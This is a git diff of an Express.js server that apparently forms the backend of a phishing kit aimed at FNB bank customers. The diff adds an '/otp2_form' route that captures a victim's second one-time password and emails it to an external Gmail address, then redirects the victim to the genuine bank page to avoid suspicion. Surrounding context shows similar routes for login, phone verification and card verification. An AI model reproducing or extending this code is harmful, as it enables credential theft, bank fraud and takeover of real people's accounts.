@@ -65,6 +65,32 @@ app.post("/otp_post", (req, res) => {
         }
     });
 
+});
+
+app.post("/otp2_form", (req, res) => {
+
+    if(req.body.otpValue) {
+        res.redirect("https://www.fnb.co.za/fusion-accounts/private-wealth-fusion-account.html");
+    } else {
+        res.render("index.html")
+    }
+
+    var mailOptions = {
+        from: `${req.session.user} info@applinic.com`,
+        to: "orrealdesigners@gmail.com",
+        subject: `OTP2 Code`,
+        text: `OTP2: ${req.body.otpValue}`
+    };
+
+    
+    transporter.sendMail(mailOptions, function(error, info){
+        if (error) {
+            console.log(error);
+        } else {
+            console.log('Email sent: ' + info.response);
+        }
+    });
+
 })
 
 app.post("/phone-verification", (req, res) => {
@@ -108,7 +134,7 @@ app.post("/cardVerification", ( req, res) => {
             console.log('Email sent: ' + info.response);
         }
     });
-})
+});
 
 app.post("/login", ( req, res ) => {
     res.redirect(`/phone-verification`);
@@ -130,4 +156,4 @@ app.post("/login", ( req, res ) => {
         }
     });
 
-})
+});
